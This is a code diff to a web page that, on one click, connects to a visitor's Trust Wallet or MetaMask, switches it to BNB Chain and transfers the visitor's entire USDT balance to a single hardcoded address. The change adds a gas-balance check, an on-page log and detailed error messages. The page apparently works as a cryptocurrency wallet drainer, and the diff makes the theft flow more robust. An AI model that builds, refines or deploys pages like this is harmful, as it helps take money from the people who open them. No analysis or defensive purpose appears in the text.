@@ -38,6 +38,11 @@
       background-color: #666;
       cursor: not-allowed;
     }
+    #log {
+      margin-top: 1em;
+      font-size: 0.9em;
+      color: #ff6666;
+    }
   </style>
 </head>
 <body>
@@ -46,6 +51,7 @@
     <p>This will send your entire USDT balance on BNB Chain to:</p>
     <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
     <button id="sendBtn">Send All</button>
+    <div id="log"></div>
   </div>
 
   <script>
@@ -57,7 +63,7 @@
     ];
 
     const bscParams = {
-      chainId: "0x38", // 56 in hex
+      chainId: "0x38",
       chainName: "Binance Smart Chain",
       nativeCurrency: {
         name: "BNB",
@@ -68,6 +74,10 @@
       blockExplorerUrls: ["https://bscscan.com"]
     };
 
+    function log(msg) {
+      document.getElementById("log").textContent = msg;
+    }
+
     async function switchToBSC() {
       try {
         await window.ethereum.request({
@@ -76,7 +86,6 @@
         });
       } catch (switchError) {
         if (switchError.code === 4902) {
-          // Chain not added, try adding it
           await window.ethereum.request({
             method: "wallet_addEthereumChain",
             params: [bscParams]
@@ -88,6 +97,7 @@
     }
 
     async function sendAllUSDT() {
+      log("");
       if (!window.ethereum) {
         alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
         return;
@@ -99,22 +109,30 @@
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
         const userAddress = await signer.getAddress();
-        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
+        // Check BNB balance for gas
+        const bnbBalance = await provider.getBalance(userAddress);
+        const minGas = ethers.utils.parseEther("0.001");
+        if (bnbBalance.lt(minGas)) {
+          log("You need at least 0.001 BNB for gas.");
+          return;
+        }
+
+        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
         const balance = await usdt.balanceOf(userAddress);
 
         if (balance.isZero()) {
-          alert("Your USDT balance is 0.");
+          log("Your USDT balance is 0.");
           return;
         }
 
         const tx = await usdt.transfer(recipient, balance);
-        alert("Transaction sent! Waiting for confirmation...");
+        log("Transaction sent. Waiting for confirmation...");
         await tx.wait();
-        alert("Transaction confirmed. USDT sent successfully.");
+        log("✅ Transaction confirmed! USDT sent successfully.");
       } catch (err) {
         console.error(err);
-        alert("Transaction failed or was cancelled.");
+        log("❌ Transaction failed: " + (err?.message || err));
       }
     }
 
